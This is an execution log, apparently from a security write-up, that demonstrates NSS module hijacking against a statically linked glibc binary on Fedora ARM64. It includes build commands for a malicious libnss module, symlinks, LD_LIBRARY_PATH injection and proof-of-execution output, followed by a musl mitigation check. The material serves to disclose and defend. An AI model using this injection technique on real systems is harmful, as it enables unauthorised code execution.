# Execution Log: Fedora 44 (glibc 2.43)

**Environment:**

- **OS:** Fedora 44
- **Kernel:** Linux 7.0.12-201.fc44.aarch64
- **Architecture:** ARM64 (aarch64)
- **glibc version:** 2.43 (Modern, >= 2.34)

---

## 1. System Environment Analysis

```text
→ User Context
uid=1000(fedora) gid=1000(fedora) groups=1000(fedora),10(wheel) context=unconfined_u:unconfined_r:unconfined_t:s0-s0:c0.c1023

→ Kernel Information
Linux fedora 7.0.12-201.fc44.aarch64 #1 SMP PREEMPT_DYNAMIC Thu Jun 11 01:33:16 UTC 2026 aarch64 GNU/Linux

→ C Standard Library
  glibc version: 2.43
  Status: Modern (>= 2.34) - 'dns' and 'files' are builtin

→ Mitigation Toolchain (musl)
[+] musl-gcc available: 16.1.1-2

→ NSS Configuration (/etc/nsswitch.conf)
  hosts:      files myhostname mdns4_minimal [NOTFOUND=return] resolve [!UNAVAIL=return] dns

  Module Vulnerability Analysis:
    ✓ files — builtin (Safe on glibc >= 2.34)
    ✓ dns — builtin (Safe on glibc >= 2.34)
    ✗ libnss_myhostname.so.2 — loaded via dlopen() (ALWAYS VULNERABLE)
    ✗ libnss_mdns4_minimal.so.2 — loaded via dlopen() (ALWAYS VULNERABLE)
    ✗ libnss_resolve.so.2 — loaded via dlopen() (ALWAYS VULNERABLE)
```

## 2. Build Process

```text
[*] Compiling all targets...

cc -Wall -Wextra -static -o gateway src/main.c
/usr/bin/ld.bfd: /tmp/ccrKiNaX.o: in function `main':
main.c:(.text+0x50): warning: Using 'getaddrinfo' in statically linked applications requires at runtime the shared libraries from the glibc version used for linking

cc -Wall -Wextra -shared -fPIC -Wl,-soname,libnss_resolve.so.2 -o libnss_resolve.so.2 src/exploit.c
[+] Universal payload built. Creating symlinks for all NSS modules...
[+] Symlinks created: libnss_resolve.so.2 libnss_dns.so.2 libnss_myhostname.so.2 libnss_mdns4_minimal.so.2
[+] gateway_musl compiled successfully.

[+] Build completed successfully
→ Build Artifacts
  gateway: 4.1M
  gateway_musl: 491K
  libnss_dns.so.2: 19
  libnss_mdns4_minimal.so.2: 19
  libnss_myhostname.so.2: 19
  libnss_resolve.so.2: 70K
```

## 3. Vulnerable Binary Analysis

```text
→ Binary Type Verification
  File type: ELF 64-bit LSB executable, ARM aarch64, version 1 (GNU/Linux), statically linked, BuildID[sha1]=3c03c2f2c58c7288feb27abaa191c660817e48b3, for GNU/Linux 3.7.0, with debug_info, not stripped
  Dynamic check: not a dynamic executable

→ Runtime Library Loading Analysis (strace)
  Intercepting system calls during DNS resolution...

  External Shared Libraries Loaded:
    ✗ /lib64/libnss_mdns4_minimal.so.2
    ✗ /lib64/libnss_myhostname.so.2
    ✗ /lib64/libnss_resolve.so.2
    ✗ /lib64/libc.so.6 (Dynamic libc cascaded!)
    ✗ /lib/ld-linux-aarch64.so.1 (Dynamic linker cascaded!)
```

## 4. Exploitation Demonstration

```text
→ Attack Vector Analysis
  Current NSS chain: files myhostname mdns4_minimal [NOTFOUND=return] resolve [!UNAVAIL=return] dns

  Potential dlopen() Triggers:
    ✓ libnss_resolve.so.2 — will be loaded via dlopen()
    ✓ libnss_myhostname.so.2 — will be loaded via dlopen()
    ✓ libnss_mdns4_minimal.so.2 — will be loaded via dlopen()

→ Payload Delivery
  Injecting malicious NSS module via LD_LIBRARY_PATH...
  [*] Executing: LD_LIBRARY_PATH=. ./gateway
[+] Gateway started. Resolving blog.jarpex.com...
[-] Resolution failed: Name or service not known

→ Exploitation Verification
[+] EXPLOITATION SUCCESSFUL
  Payload Output (/tmp/pwned.txt):
    === PWNED BY NSS ===
    uid=1000(fedora) gid=1000(fedora) groups=1000(fedora),10(wheel) context=unconfined_u:unconfined_r:unconfined_t:s0-s0:c0.c1023
```

## 5. Mitigation Verification (musl libc)

```text
→ Hardened Binary Analysis (strace)
  File Access During DNS Resolution:
    ✓ /etc/hosts (config file)
    ✓ /etc/resolv.conf (config file)

[+] ISOLATION VERIFIED: No external shared libraries loaded.
```

## 6. Cleanup

```text
[*] Removing build artifacts and exploit traces...
rm -f gateway gateway_musl
rm -f libnss_resolve.so.2 libnss_dns.so.2 libnss_myhostname.so.2 libnss_mdns4_minimal.so.2
rm -f /tmp/pwned.txt
[+] Cleanup completed
```
